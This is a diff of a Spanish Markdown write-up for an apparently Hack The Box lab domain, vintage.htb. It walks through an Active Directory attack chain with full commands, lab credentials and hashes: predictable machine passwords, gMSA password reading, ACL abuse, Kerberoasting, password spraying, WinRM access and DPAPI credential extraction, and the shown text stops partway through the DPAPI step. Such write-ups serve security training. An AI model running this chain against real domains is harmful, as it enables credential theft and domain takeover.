@@ -24,14 +24,44 @@ Con las credenciales obtenidas se accede al sistema, se descifran credenciales a
 mediante **DPAPI** y finalmente se abusa de **Resource-Based Constrained Delegation (RBCD)**
 para impersonar a un administrador del dominio y ejecutar un **DCSync**.
 
+### Cadena de ataque
+
+```
+P.Rosa (creds iniciales)
+    │
+    ▼
+PRE2k → FS01$ (contraseña predecible)
+    │
+    ▼
+ReadGMSAPassword → gMSA01$ (hash NTLM)
+    │
+    ▼
+AddSelf → grupo ServiceManagers
+    │
+    ▼
+GenericAll → habilitar SVC_SQL + asignar SPN
+    │
+    ▼
+Kerberoasting → hash TGS → contraseña Zer0the0ne
+    │
+    ▼
+Password Spray → C.Neri (WinRM)
+    │
+    ▼
+DPAPI → credenciales C.Neri_adm
+    │
+    ▼
+RBCD + S4U2Proxy → impersonar L.Bianchi_adm
+    │
+    ▼
+DCSync → hash Administrator → SYSTEM
+```
+
 ---
 
 ## Reconocimiento
 
 ### Comprobación de conectividad
-
-Se enviará una solicitud de **ICMP** (`ping`) para comprobar que la máquina objetivo se
-encuentra activa y accesible.
 
 ```bash
 ping -c 1 10.129.20.217
@@ -42,9 +72,6 @@ ping -c 1 10.129.20.217
 ```
 
 ### Escaneo de Puertos
-
-Se ejecutará un escaneo de puertos con **Rustscan** para identificar los servicios expuestos
-en la máquina objetivo.
 
 ```bash
 rustscan -a $IP --ulimit 1000 -r 1-65535 -- -A -sC -sV -Pn -o nmapresult.txt
@@ -69,23 +96,20 @@ rustscan -a $IP --ulimit 1000 -r 1-65535 -- -A -sC -sV -Pn -o nmapresult.txt
 
 ### Análisis del escaneo
 
-Los puertos habituales de **Active Directory** se encuentran abiertos, incluyendo **DNS**,
-**Kerberos**, **LDAP**, **SMB** y **WinRM**, lo que confirma que el host corresponde a un
-**Controlador de Dominio** dentro del entorno `vintage.htb`.
+Los puertos habituales de **Active Directory** confirman que el host es un **Controlador de Dominio** del entorno `vintage.htb`.
 
-- **Firma SMB:** La firma obligatoria está habilitada, lo que descarta ataques de
-  retransmisión **NTLM**. Será necesario buscar otros vectores de ataque.
-- **WinRM habilitado:** El puerto `5985` está abierto, lo que permite acceso remoto con
-  credenciales válidas mediante **Windows Remote Management**.
-- **Desfase horario:** Se detectó una diferencia de hora entre el servidor y nuestra máquina.
-  Este detalle es crítico para ataques **Kerberos**, que fallarán si no se sincroniza
-  previamente el reloj del sistema.
+**Observaciones clave:**
+
+- **NTLM deshabilitado:** No hay forma de autenticarse con usuario:contraseña directamente contra SMB/LDAP de forma estándar. Todos los ataques deberán usar tickets Kerberos obtenidos previamente con `kinit` o herramientas de Impacket.
+- **Firma SMB obligatoria:** Descarta ataques de relay NTLM como Responder + ntlmrelayx.
+- **WinRM en 5985:** Permite acceso remoto con credenciales válidas vía `evil-winrm`.
+- **Desfase horario crítico:** Kerberos requiere que la diferencia de hora entre cliente y KDC sea menor a 5 minutos. Si hay skew, los tickets serán rechazados con `KRB_AP_ERR_SKEW`. Sincronizar con `sudo ntpdate -u $IP` antes de cualquier ataque Kerberos.
 
 ---
 
 ## Enumeración inicial (NXC)
 
-Reutilizaremos las credenciales filtradas por el creador para realizar una enumeración autenticada.
+Reutilizaremos las credenciales filtradas por el creador de la máquina para realizar una enumeración autenticada.
 
 ### NTLM deshabilitado
 
@@ -100,13 +124,15 @@ SMB  10.129.20.217  445  dc01  [*] x64 (name:dc01) (domain:vintage.htb) (signing
 SMB  10.129.20.217  445  dc01  [-] vintage.htb\P.Rosa:Rosaisbest123 STATUS_NOT_SUPPORTED
 ```
 
-> La autenticación **NTLM** está deshabilitada. Será necesario utilizar tickets **Kerberos**.
+> `STATUS_NOT_SUPPORTED` indica que el servidor rechazó el método de autenticación NTLM. Para operar en este entorno es obligatorio usar Kerberos.
 
-Obtenemos el TGT de `P.Rosa`:
+Obtenemos el TGT de `P.Rosa` directamente con `kinit`, que solicita un **Ticket Granting Ticket** al KDC usando las credenciales en texto claro:
 
 ```bash
 kinit P.rosa@VINTAGE.HTB
 ```
+
+A partir de aquí, NXC usará la caché de tickets Kerberos (`KRB5CCNAME`) con el flag `-k` en lugar de enviar credenciales NTLM.
 
 ### Enumeración de usuarios
 
@@ -114,23 +140,17 @@ kinit P.rosa@VINTAGE.HTB
 nxc smb $IP -u 'P.Rosa' -p 'Rosaisbest123' -k --users
 ```
 
-**Output:**
-
 ```
-SMB  10.129.12.39  445  DC  [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:None) (Null Auth:True)
-SMB  10.129.12.39  445  DC  [+] administrator.htb\Olivia:ichliebedich
-SMB  10.129.12.39  445  DC  -Username-      -Last PW Set-        -BadPW-  -Description-
-SMB  10.129.12.39  445  DC  Administrator   2024-10-22 18:59:36  0        Built-in account for administering the computer/domain
-SMB  10.129.12.39  445  DC  Guest           <never>              0        Built-in account for guest access to the computer/domain
-SMB  10.129.12.39  445  DC  krbtgt          2024-10-04 19:53:28  0        Key Distribution Center Service Account
-SMB  10.129.12.39  445  DC  olivia          2024-10-06 01:22:48  0
-SMB  10.129.12.39  445  DC  michael         2024-10-06 01:33:37  0
-SMB  10.129.12.39  445  DC  benjamin        2024-10-06 01:34:56  0
-SMB  10.129.12.39  445  DC  emily           2024-10-30 23:40:02  0
-SMB  10.129.12.39  445  DC  ethan           2024-10-12 20:52:14  0
-SMB  10.129.12.39  445  DC  alexander       2024-10-31 00:18:04  0
-SMB  10.129.12.39  445  DC  emma            2024-10-31 00:18:35  0
-SMB  10.129.12.39  445  DC  [*] Enumerated 10 local users: ADMINISTRATOR
+SMB  10.129.20.217  445  dc01  [+] vintage.htb\P.Rosa:Rosaisbest123
+SMB  10.129.20.217  445  dc01  Administrator   2025-04-17 15:45:01 0
+SMB  10.129.20.217  445  dc01  Guest           <never>             0
+SMB  10.129.20.217  445  dc01  krbtgt          2025-04-17 16:00:02 0
+SMB  10.129.20.217  445  dc01  ca_svc          2025-04-17 16:07:50 0
+SMB  10.129.20.217  445  dc01  ldap_svc        2025-04-17 16:17:00 0
+SMB  10.129.20.217  445  dc01  p.agila         2025-04-18 14:37:08 0
+SMB  10.129.20.217  445  dc01  winrm_svc       2025-05-18 00:51:16 0
+SMB  10.129.20.217  445  dc01  j.coffey        2025-04-19 12:09:55 0
+SMB  10.129.20.217  445  dc01  j.fleischman    2025-05-16 14:46:55 0
 ```
 
 ### Enumeración de recursos compartidos
@@ -139,99 +159,100 @@ SMB  10.129.12.39  445  DC  [*] Enumerated 10 local users: ADMINISTRATOR
 nxc smb $IP -u 'P.Rosa' -p 'Rosaisbest123' -k --shares
 ```
 
-**Output:**
-
-```
-LDAP  10.129.12.39  389  DC  [*] Windows Server 2022 Build 20348 (name:DC) (domain:administrator.htb) (signing:None) (channel binding:No TLS cert)
-LDAP  10.129.12.39  389  DC  [+] administrator.htb\Olivia:ichliebedich
-...
-Administrators              Members have complete and unrestricted access to the computer/domain
-Users                       Users are prevented from making accidental or intentional system-wide changes...
-Remote Desktop Users        Members in this group are granted the right to logon remotely
-Hyper-V Administrators      Members of this group have complete and unrestricted access to all features of Hyper-V
-...
-```
-
-Los resultados muestran los recursos predeterminados de **Active Directory** (`ADMIN$`, `C$`,
-`IPC$`, `NETLOGON` y `SYSVOL`), sin recursos no estándar de interés inmediato.
+Los resultados muestran los recursos predeterminados de AD (`ADMIN$`, `C$`, `IPC$`, `NETLOGON`, `SYSVOL`), sin recursos no estándar de interés inmediato.
 
 ---
 
-## Análisis de Dominio - BloodHound
-
-Recopilamos información del dominio con las credenciales obtenidas para identificar
-rutas de ataque y escalada de privilegios.
+## Análisis de Dominio — BloodHound
 
 ```bash
 bloodhound-ce-python -u 'P.Rosa' -p 'Rosaisbest123' -d vintage.htb -ns $IP -c All --zip
 ```
 
-### PRE-Windows 2000 Compatible Access
-
-BloodHound revela que el grupo **Pre-Windows 2000 Compatible Access** está presente en el
-dominio. Este grupo es un riesgo de seguridad heredado de **Active Directory** que permite
-a usuarios autenticados (y a veces anónimos) leer la mayoría de los atributos de los objetos
-del dominio.
-
-![PRE2k](/assets/img/vintage/pre2k.png)
-
-En entornos con este grupo activo, las cuentas de equipo creadas con compatibilidad heredada
-suelen tener como contraseña el nombre del host en minúsculas. Probamos con `fs01`:
-
-```bash
-nxc smb $IP -u 'fs01' -p 'fs01' -k
-```
-
-```
-SMB  10.129.20.217  445  dc01  [+] vintage.htb\fs01:fs01
-```
-
-> Credenciales válidas. El equipo `FS01` usa su propio nombre como contraseña.
+BloodHound recopila todos los objetos del dominio (usuarios, grupos, GPOs, ACLs, sesiones, delegaciones) y construye un grafo de relaciones que permite identificar rutas de ataque que serían invisibles analizando objetos individualmente.
 
 ---
 
-## ReadGMSAPassword: De FS01 a GMSA01
+## PRE2k — Credenciales predecibles en cuentas de equipo
 
-BloodHound muestra que `FS01` es miembro del grupo **Domain Computers**, y este grupo tiene
-el permiso `ReadGMSAPassword` sobre la cuenta `gMSA01$`.
+### ¿Qué es Pre-Windows 2000 Compatible Access?
+
+Es un grupo heredado de Active Directory que existe por compatibilidad con sistemas anteriores a Windows 2000. Su presencia no es el problema en sí — el problema real es el **proceso de unión al dominio** que usaron para agregar ciertas cuentas de equipo.
+
+Cuando un equipo se une al dominio con la opción **"Assign this computer account as a pre-Windows 2000 computer"**, Active Directory establece la contraseña de la cuenta de equipo como **el nombre del host en minúsculas** (sin el `$`). Esto es un comportamiento documentado desde la era de NT4, y muchos administradores lo desconocen o lo olvidan.
+
+**¿Por qué es explotable?**
+
+Las cuentas de equipo (`MACHINE$`) son cuentas de AD completamente funcionales. Pueden autenticarse, obtener TGTs, acceder a recursos y —lo más importante para nosotros— tienen membresías de grupo y permisos sobre otros objetos del dominio. Si la contraseña es predecible, es equivalente a tener credenciales válidas.
+
+**Diferencia clave con otros ataques:** No hay bruteforce, no hay tráfico de red sospechoso. Es simplemente conocer la convención de nomenclatura que usó el administrador.
+
+BloodHound revela que el grupo **Pre-Windows 2000 Compatible Access** está presente y que `FS01$` fue creada con esta configuración. Probamos la contraseña predecible:
+
+```bash
+nxc smb $IP -u 'fs01$' -p 'fs01' -k
+```
+
+```
+SMB  10.129.20.217  445  dc01  [+] vintage.htb\fs01$:fs01
+```
+
+> La cuenta de equipo `FS01$` usa su nombre en minúsculas como contraseña. Tenemos credenciales válidas.
+
+---
+
+## ReadGMSAPassword — De FS01$ a gMSA01$
+
+### ¿Qué es una cuenta GMSA?
+
+Una **Group Managed Service Account (gMSA)** es un tipo especial de cuenta de servicio en Active Directory diseñada para que las contraseñas sean gestionadas automáticamente por el propio AD. La contraseña tiene 256 bytes aleatorios y rota automáticamente cada 30 días. Ningún humano la conoce — la obtienen programáticamente las entidades autorizadas.
+
+**¿Cómo funciona la autorización?**
+
+El atributo `msDS-GroupMSAMembership` de la cuenta gMSA define qué principals (usuarios, grupos, equipos) tienen permiso para **leer la contraseña**. Esto se controla a nivel de ACL en el directorio.
+
+**¿Qué pasa si tenemos `ReadGMSAPassword`?**
+
+Podemos consultar el atributo `msDS-ManagedPassword` de la cuenta gMSA vía LDAP y obtener el hash NTLM actual. Esto equivale a conocer la contraseña sin necesidad de crackearla — podemos hacer Pass-the-Hash directamente (o en este caso, usar el hash para obtener un TGT con `-hashes`).
+
+BloodHound muestra que `FS01$` es miembro del grupo **Domain Computers**, y este grupo tiene `ReadGMSAPassword` sobre `gMSA01$`:
 
 ![ReadGMSA](/assets/img/vintage/Readgmspassword.png)
 
-Leemos la contraseña **GMSA** directamente con **NXC**:
-
 ```bash
-nxc ldap $IP -u 'fs01' -p 'fs01' -k --gmsa
+nxc ldap $IP -u 'fs01$' -p 'fs01' -k --gmsa
 ```
 
-**Output:**
-
 ```
-LDAP  10.129.20.217  389  DC01  [*] None (name:DC01) (domain:vintage.htb) (signing:None) (channel binding:No TLS cert) (NTLM:False)
-LDAP  10.129.20.217  389  DC01  [+] vintage.htb\fs01:fs01
+LDAP  10.129.20.217  389  DC01  [+] vintage.htb\fs01$:fs01
 LDAP  10.129.20.217  389  DC01  [*] Getting GMSA Passwords
-LDAP  10.129.20.217  389  DC01  Account: gMSA01$   NTLM: 0851299c01b944d01099fc977eaa6c67   PrincipalsAllowedToReadPassword: Domain Computers
+LDAP  10.129.20.217  389  DC01  Account: gMSA01$   NTLM: 0851299c01b944d01099fc977eaa6c67
 ```
+
+> Tenemos el hash NTLM de `gMSA01$`. Aunque no podemos crackearlo (es aleatorio), podemos usarlo directamente con Impacket para obtener un TGT Kerberos.
 
 ---
 
-## AddSelf: De GMSA01 a ServiceManagers
+## AddSelf — De gMSA01$ a ServiceManagers
 
-Continuando la enumeración, `gMSA01$` tiene el permiso `AddSelf` sobre el grupo
-**ServiceManagers**, lo que le permite añadirse a sí mismo.
+### ¿Qué es el permiso AddSelf?
+
+`AddSelf` es un permiso de ACL en Active Directory que permite a un principal **añadirse a sí mismo** como miembro de un grupo, sin necesidad de tener permisos de administración sobre el grupo. Es diferente de `AddMember` (que permite añadir a cualquier otro objeto).
+
+**¿Por qué es relevante?**
+
+En una auditoría normal este permiso puede parecer inofensivo — "solo se añade a sí mismo". Pero en el contexto de un ataque encadenado, si el grupo al que puede unirse tiene permisos privilegiados sobre otros objetos del dominio, `AddSelf` se convierte en el escalón que abre la siguiente puerta.
+
+BloodHound muestra que `gMSA01$` tiene `AddSelf` sobre **ServiceManagers**:
 
 ![AddSelf](/assets/img/vintage/addself.png)
 
-Antes de proceder, necesitamos un **TGT** de `gMSA01$` ya que NTLM está deshabilitado:
+Antes de ejecutar el ataque necesitamos un TGT de `gMSA01$`. Como NTLM está deshabilitado, usamos el hash para pedir el ticket directamente al KDC:
 
 ```bash
 getTGT.py vintage.htb/gMSA01\$ -hashes :0851299c01b944d01099fc977eaa6c67 -dc-ip $IP
-```
-
-```bash
 export KRB5CCNAME=$(pwd)/gMSA01\$.ccache
 ```
-
-Añadimos `gMSA01$` al grupo **ServiceManagers**:
 
 ```bash
 bloodyAD --host dc01.vintage.htb --dc-ip $IP -d vintage.htb -u 'gMSA01$' -k add groupMember SERVICEMANAGERS 'gMSA01$'
@@ -243,18 +264,36 @@ bloodyAD --host dc01.vintage.htb --dc-ip $IP -d vintage.htb -u 'gMSA01$' -k add 
 
 ---
 
-## GenericAll y Kerberoasting: Recuperación de SVC_SQL
+## GenericAll y Kerberoasting — De ServiceManagers a SVC_SQL
 
-Al enumerar el grupo **ServiceManagers**, BloodHound revela que tiene el permiso `GenericAll`
-sobre tres usuarios de servicio.
+### ¿Qué es el permiso GenericAll?
+
+`GenericAll` es el permiso más amplio en las ACLs de Active Directory. Equivale a **control total** sobre el objeto — el titular puede modificar cualquier atributo, cambiar la contraseña, añadir SPNs, desactivar/activar la cuenta, etc.
+
+Cuando `GenericAll` apunta a una **cuenta de usuario**, abre múltiples vectores:
+- **Targeted Kerberoasting:** asignar un SPN falso y solicitar un TGS crackeable.
+- **Shadow Credentials:** escribir en `msDS-KeyCredentialLink` para obtener un certificado.
+- **Force Password Change:** cambiar la contraseña directamente (ruidoso).
+
+### ¿Qué es Kerberoasting y por qué funciona?
+
+Cuando un usuario solicita acceso a un servicio identificado por un **SPN** (Service Principal Name), el KDC emite un **Ticket de Servicio (TGS)** cifrado con el hash NTLM de la cuenta que tiene ese SPN registrado.
+
+El punto crítico: **cualquier usuario autenticado en el dominio puede solicitar este TGS**. No necesitas ser administrador. El KDC simplemente emite el ticket sin verificar si realmente vas a usar ese servicio.
+
+El TGS está cifrado con RC4 (o AES si la cuenta lo soporta), y podemos intentar craquearlo offline sin hacer ruido adicional en la red. Si la contraseña de la cuenta de servicio es débil, la obtenemos.
+
+**¿Por qué SVC_SQL estaba deshabilitada?**
+
+Las cuentas deshabilitadas no pueden recibir TGS. Por eso el primer paso es habilitarla usando `GenericAll`, luego asignarle un SPN falso y finalmente realizar el Kerberoasting.
+
+BloodHound revela que **ServiceManagers** tiene `GenericAll` sobre varios usuarios de servicio:
 
 ![GenericAll](/assets/img/vintage/genericall.png)
 
-Uno de ellos, `SVC_SQL`, está deshabilitado:
+### 1. Habilitar SVC_SQL
 
-![Disabled](/assets/img/vintage/sqldisable.png)
-
-### 1. Habilitar la cuenta SVC_SQL
+El atributo `userAccountControl` con valor `512` corresponde a una cuenta de usuario normal y habilitada. El valor `514` es la misma cuenta pero deshabilitada. Cambiamos a `512`:
 
 ```bash
 bloodyAD --host dc01.vintage.htb --dc-ip $IP -d vintage.htb -u 'gMSA01$' -k set object SVC_SQL userAccountControl -v 512
@@ -266,6 +305,8 @@ bloodyAD --host dc01.vintage.htb --dc-ip $IP -d vintage.htb -u 'gMSA01$' -k set 
 
 ### 2. Asignar un SPN falso
 
+Para que el KDC emita un TGS para `SVC_SQL`, la cuenta necesita tener un SPN registrado. Asignamos uno arbitrario:
+
 ```bash
 bloodyAD --host dc01.vintage.htb --dc-ip $IP -d vintage.htb -u 'gMSA01$' -k set object SVC_SQL servicePrincipalName -v 'MSSQLSvc/d0c1.vintage.htb'
 ```
@@ -276,85 +317,54 @@ bloodyAD --host dc01.vintage.htb --dc-ip $IP -d vintage.htb -u 'gMSA01$' -k set 
 
 ### 3. Kerberoasting
 
+Solicitamos el TGS para todos los SPNs del dominio usando nuestra caché de tickets actual:
+
 ```bash
 nxc ldap dc01.vintage.htb -k --use-kcache --kerberoasting hashes.kerberoast
 ```
 
-**Output:**
-
 ```
-LDAP  dc01.vintage.htb 389  DC01  [*] None (name:DC01) (domain:VINTAGE.HTB) (signing:None) (channel binding:No TLS cert) (NTLM:False)
 LDAP  dc01.vintage.htb 389  DC01  [+] VINTAGE.HTB\gMSA01$ from ccache
-LDAP  dc01.vintage.htb 389  DC01  [*] Skipping disabled account: krbtgt
-LDAP  dc01.vintage.htb 389  DC01  [*] Total of records returned 1
-LDAP  dc01.vintage.htb 389  DC01  [*] sAMAccountName: svc_sql, memberOf: CN=ServiceAccounts,OU=Pre-Migration,DC=vintage,DC=htb, pwdLastSet: 2026-04-17 19:52:04.534353, lastLogon: 2026-04-17 16:31:06.487462
-LDAP  dc01.vintage.htb 389  DC01  $krb5tgs$23$*svc_sql$VINTAGE.HTB$vintage.htb\svc_sql*4aa19042ea59f98f2a94fddc7225c939$0c6f5af1cbdf5ef9b66ba7affac0485ce517057f9e022115818808f1817a2e9254d95ce6f2f517d8239dcd842a4911c5928c7eb3906c10d149454fdd02847a4a8bc64b84923a1436032aa07946b65dcf052e681d64c411cf01cc148137b9e849dbe771e16d7cad7d919a4de3f1eb4bb0ebdb57fcf09475897b35e295c98553007ed8126ae38e8a7150bde122f48edcda3030d61c5eb9259e1f830caac2ef048efc361526bbd58bb5fcd68d97b3a6c93f6457f464dd7b04ea403a70b6503969d5050b2761e38c2add80fdc743d9e6a0e3707f67605f65868f36e153950f4ca1aca17eb2151a095cb0f4f1aab2a99a2f9fc4344a517bbafc9ee371ac984f1210098ce9fa4726f4ef02313d96a42d38e4de043760ee76c024828c2a30ec748ad0942195eca315c5d56ed954399dcc7b71825d3c7df47c805da283a381b332ecacb6bcc4f1f84cf5f4795d77d32b34d8b03939c2e328902ae6095e33cc30bc7f99dfe8cbaba11c3ddfd49879bb822fcf24ada611d8d533ab24cef1ec4653824f5bfe9187d649dd35ea4f5e123ba4f4709391585322e70fbd1e2d827773327142893c4341eda0efddb345363800e369e44783e3c60bdc32c386e27af4234d82bc600f513f0c99b4d3b60586d7bf42243699686abc6e1d1cc366a032bf24c8eb9785acc808cd3b23c77714332c7e886933e6a840a2c0b8f07637ac92a1164c3a3d66e27a3b57914f8c162ba5bc284d33f425047e7e089076428fb3354c920e298d407f09128c6ec5b5fa486f859c279bb9fb75abe1efa6d89e1e5000d8feb8c0704b2a9238ffee7f1671421b3d8fa53d91c39482c7a6e01de136f8170de2849d9f237b5ef5df73b47da4283b7d0e7b72663c9fed79e4209b482d329f392c30466d3dafa253b1a06232956148f88170ce7a5785e1d7238fe6008ede865c5e98a56abfd4325422ec32e6ee076fa60103a390f8f5f4209c664827652575d92baaeb96c1b57075319b9eba596dfc4970a9512c41da41a8c20e4a2446dba98c039d1767aa7cd083924169fe362670cf59af0ba2ead496bfc141c2f8c0d380ced413320064ccfbd5701e516ec11f3ada4bf4ec3ce962767f79672148fd1b6a7cacdf671962f4552e4b13f1cd7471931b2c495cc0acb82bca2d70fa7ca31b38ae4ca65b9ec5767cd94a08063ccddf411cc0eb3f3f8b78e254188d8892259f16ec11f3ada7f3f1144a8b601e448ab3c7f249e7bd28e7fd61ab7def6695950e5c27ff7ddb9770bdb43fb69037f3e9166b8ad2f05f179445256bd68f3e910b9790154eb630a7a952276ad377ccd339ea0c924734f179370bae5eff0bcad02dd98312c136e93d6748f5a3745f5e84734d37c2693a0f443a646adf6b1d474ce2cea037dbb36af94ff8aaa904caeeb3e57969d736499b762d
+LDAP  dc01.vintage.htb 389  DC01  [*] sAMAccountName: svc_sql
+LDAP  dc01.vintage.htb 389  DC01  $krb5tgs$23$*svc_sql$VINTAGE.HTB$...<hash>...
 ```
 
-Crackeamos el hash offline con **Hashcat**:
+### 4. Crackeo offline con Hashcat
+
+El tipo `-m 13100` corresponde a TGS-REP (Kerberos 5 TGS-REP etype 23, RC4):
 
 ```bash
 hashcat -a 0 -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt
 ```
 
-**Contraseña:** `Zer0the0ne`
+**Contraseña obtenida:** `Zer0the0ne`
 
 ---
 
-## Movimiento Lateral: Password Spray
+## Movimiento Lateral — Password Spray con Kerberos
 
-Con la contraseña obtenida ejecutamos un **Password Spray** contra todos los usuarios
-enumerados previamente:
+Con la contraseña obtenida del Kerberoasting, realizamos un **Password Spray** contra todos los usuarios del dominio. A diferencia de un bruteforce (muchas contraseñas contra un usuario), el spray prueba **una sola contraseña contra muchos usuarios**, lo que reduce enormemente el riesgo de bloqueo de cuentas.
 
 ```bash
 nxc ldap $IP -u users.txt -p Zer0the0ne --continue-on-success -k
 ```
 
-**Output:**
+```
+LDAP  10.129.20.217  389  DC01  [+] vintage.htb\C.Neri:Zer0the0ne
+LDAP  10.129.20.217  389  DC01  [+] vintage.htb\svc_sql:Zer0the0ne
+```
 
-```
-LDAP  10.129.20.217  389  DC01  [*] None (name:DC01) (domain:vintage.htb) (signing:None) (channel binding:No TLS cert) (NTLM:False)
-LDAP  10.129.20.217  389  DC01  [-] vintage.htb\Administrator:Zer0the0ne KDC_ERR_PREAUTH_FAILED
-LDAP  10.129.20.217  389  DC01  [-] vintage.htb\Guest:Zer0the0ne KDC_ERR_CLIENT_REVOKED
-LDAP  10.129.20.217  389  DC01  [-] vintage.htb\krbtgt:Zer0the0ne KDC_ERR_CLIENT_REVOKED
-LDAP  10.129.20.217  389  DC01  [-] vintage.htb\M.Rossi:Zer0the0ne KDC_ERR_PREAUTH_FAILED
-LDAP  10.129.20.217  389  DC01  [-] vintage.htb\R.Verdi:Zer0the0ne KDC_ERR_PREAUTH_FAILED
-LDAP  10.129.20.217  389  DC01  [-] vintage.htb\L.Bianchi:Zer0the0ne KDC_ERR_PREAUTH_FAILED
-LDAP  10.129.20.217  389  DC01  [-] vintage.htb\G.Viola:Zer0the0ne KDC_ERR_PREAUTH_FAILED
-LDAP  10.129.20.217  389  DC01  [+] vintage.htb\C.Neri:Zer0the0ne 
-LDAP  10.129.20.217  389  DC01  [-] vintage.htb\P.Rosa:Zer0the0ne KDC_ERR_PREAUTH_FAILED
-LDAP  10.129.20.217  389  DC01  [+] vintage.htb\svc_sql:Zer0the0ne 
-LDAP  10.129.20.217  389  DC01  [-] vintage.htb\svc_ldap:Zer0the0ne KDC_ERR_PREAUTH_FAILED
-LDAP  10.129.20.217  389  DC01  [-] vintage.htb\svc_ark:Zer0the0ne KDC_ERR_PREAUTH_FAILED
-LDAP  10.129.20.217  389  DC01  [-] vintage.htb\C.Neri_adm:Zer0the0ne KDC_ERR_PREAUTH_FAILED
-LDAP  10.129.20.217  389  DC01  [-] vintage.htb\L.Bianchi_adm:Zer0the0ne KDC_ERR_PREAUTH_FAILED
-```
+`C.Neri` reutilizó la contraseña de `SVC_SQL`. Esto es un error de seguridad común en entornos donde los administradores comparten o sincronizan contraseñas entre cuentas.
 
 ---
 
-## Acceso Inicial: Evil-WinRM como C.Neri
-
-Obtenemos el **TGT** del usuario `C.Neri` y accedemos al sistema:
+## Acceso Inicial — Evil-WinRM como C.Neri
 
 ```bash
 kinit C.Neri@VINTAGE.HTB
-```
-
-```bash
-klist
-```
-
-```
-Default principal: C.Neri@VINTAGE.HTB
-Valid starting       Expires              Service principal
-04/17/2026 20:11:53  04/18/2026 06:11:53  krbtgt/VINTAGE.HTB@VINTAGE.HTB
-```
-
-```bash
+export KRB5CCNAME=$(pwd)/C.Neri.ccache
 evil-winrm -i dc01.vintage.htb -r vintage.htb -u C.Neri
 ```
-
-### Flag de usuario
 
 ```powershell
 *Evil-WinRM* PS C:\Users\C.Neri> type Desktop\user.txt
@@ -363,79 +373,71 @@ evil-winrm -i dc01.vintage.htb -r vintage.htb -u C.Neri
 
 ---
 
-## Escalada de Privilegios
+## Escalada de Privilegios — DPAPI Credential Extraction
 
-### Extracción de credenciales via DPAPI
+### ¿Qué es DPAPI?
 
-Buscamos credenciales almacenadas en el perfil del usuario:
+**Data Protection API (DPAPI)** es un sistema de cifrado de Windows diseñado para que las aplicaciones puedan almacenar secretos (contraseñas, tokens, claves) de forma segura sin tener que gestionar las claves de cifrado ellas mismas. El sistema operativo se encarga de todo.
+
+**¿Cómo funciona internamente?**
+
+El flujo de cifrado/descifrado de DPAPI funciona así:
+
+```
+Contraseña del usuario
+        │
+        ▼
+  PBKDF2 / SHA1
+        │
+        ▼
+   Masterkey (cifrada con la contraseña del usuario)
+        │  almacenada en:
+        │  %APPDATA%\Microsoft\Protect\{SID}\{GUID}
+        ▼
+   Blob cifrado (credencial, cookie, etc.)
+        │  almacenado en:
+        │  %APPDATA%\Microsoft\Credentials\{GUID}
+        ▼
+   Dato en claro (solo accesible con la Masterkey)
+```
+
+La **Masterkey** es la clave maestra que descifra todos los blobs. Está protegida por la contraseña del usuario (y opcionalmente por la contraseña del dominio a través del DPAPI backup del DC). Para descifrar cualquier dato protegido por DPAPI necesitamos:
+1. El archivo de Masterkey del usuario.
+2. La contraseña del usuario (o acceso al DC para usar el backup de dominio).
+3. El SID del usuario (para identificar la Masterkey correcta).
+
+**¿Por qué es poderoso desde perspectiva ofensiva?**
+
+Windows y muchas aplicaciones almacenan credenciales con DPAPI por defecto: credenciales del Administrador de credenciales de Windows, cookies de navegadores, contraseñas de VPN, certificados privados, etc. Una vez comprometida una cuenta, DPAPI puede revelar credenciales de otras cuentas almacenadas en ese perfil.
+
+### Extracción de archivos
+
+Buscamos los archivos relevantes en el perfil de `C.Neri`:
 
 ```powershell
+# Blobs de credenciales (datos cifrados)
 ls C:\Users\C.Neri\AppData\Roaming\Microsoft\Credentials\ -Force
+ls C:\Users\C.Neri\AppData\Local\Microsoft\Credentials\ -Force
+
+# Masterkeys (claves maestras cifradas con la contraseña del usuario)
+ls "C:\Users\C.Neri\AppData\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115\" -Force
 ```
 
-**Output:**
-
-```
-
-    Directory: C:\Users\C.Neri\AppData\Local\Microsoft\Credentials
-
-Mode                LastWriteTime         Length Name
-----                -------------         ------ ----
--a-hs-              6/7/2024   5:08 PM            430 C4BB96844A5C9DD45D5B6A9859252BA6
-
-*Evil-WinRM* PS C:\Users\C.Neri\Documents> ls C:\Users\C.Neri\AppData\Roaming\Microsoft\Protect\ -Force
-
-    Directory: C:\Users\C.Neri\AppData\Roaming\Microsoft\Protect
-
-Mode                LastWriteTime         Length Name
-----                -------------         ------ ----
--a-hs-              6/7/2024   1:17 PM          11020 DFBE70A7E5CC19A398EBF1B96859CE5D
-
-*Evil-WinRM* PS C:\Users\C.Neri\Documents> ls C:\Users\C.Neri\AppData\Roaming\Microsoft\Protect\ -Force
-
-    Directory: C:\Users\C.Neri\AppData\Roaming\Microsoft\Protect
-
-Mode                LastWriteTime         Length Name
-----                -------------         ------ ----
-d---s-              6/7/2024   1:17 PM                 S-1-5-21-4024337825-2033394866-2055507597-1115
--a-hs-              6/7/2024   1:17 PM             24 CREDHIST
--a-hs-              6/7/2024   1:17 PM             76 SYNCHIST
-
-*Evil-WinRM* PS C:\Users\C.Neri\Documents> ls "C:\Users\C.Neri\AppData\Roaming\Microsoft\Protect\S-1-5-21-*" -Force
-
-    Directory: C:\Users\C.Neri\AppData\Roaming\Microsoft\Protect
-
-Mode                LastWriteTime         Length Name
-----                -------------         ------ ----
-d---s-              6/7/2024   1:17 PM                 S-1-5-21-4024337825-2033394866-2055507597-1115
-```
-
-Exportamos las masterkeys y blobs de credencial en **Base64** para procesarlos en nuestra máquina:
+Exportamos en Base64 para transferirlos a nuestra máquina sin corromperlos:
 
 ```powershell
-# Masterkey 1
-[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Users\C.Neri\AppData\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115\4dbf04d8-529b-4b4c-b4ae-8e875e4fe847"))
-
-# Masterkey 2
 [Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Users\C.Neri\AppData\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115\99cf41a3-a552-4cf7-a8d7-aca2d6f7339b"))
-
-# Blob Roaming
 [Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Users\C.Neri\AppData\Roaming\Microsoft\Credentials\C4BB96844A5C9DD45D5B6A9859252BA6"))
-
-# Blob Local
